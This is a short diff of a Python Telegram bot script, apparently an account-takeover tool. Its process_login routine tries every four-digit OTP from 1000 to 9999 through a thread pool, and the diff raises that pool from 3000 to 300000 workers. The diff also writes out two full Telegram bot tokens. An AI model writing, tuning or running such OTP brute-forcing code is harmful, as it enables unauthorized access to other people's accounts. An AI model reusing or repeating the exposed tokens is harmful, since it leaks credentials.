@@ -8,7 +8,7 @@ from telegram import Update
 from telegram.ext import Application, MessageHandler, filters, ContextTypes, CommandHandler
 from telegram.error import BadRequest
 
-BOT_TOKEN = "6223059105:AAH7V_L8hlhbpzZgE5j9ZHoZc1DAo8Z7o5I"
+BOT_TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
 
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
@@ -130,7 +130,7 @@ async def process_login(chat_id, bot, message_data, key):
 
     async def check_otp_with_updates():
         nonlocal found_otp, checked_otps, last_update
-        with concurrent.futures.ThreadPoolExecutor(max_workers=3000) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=300000) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
             for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
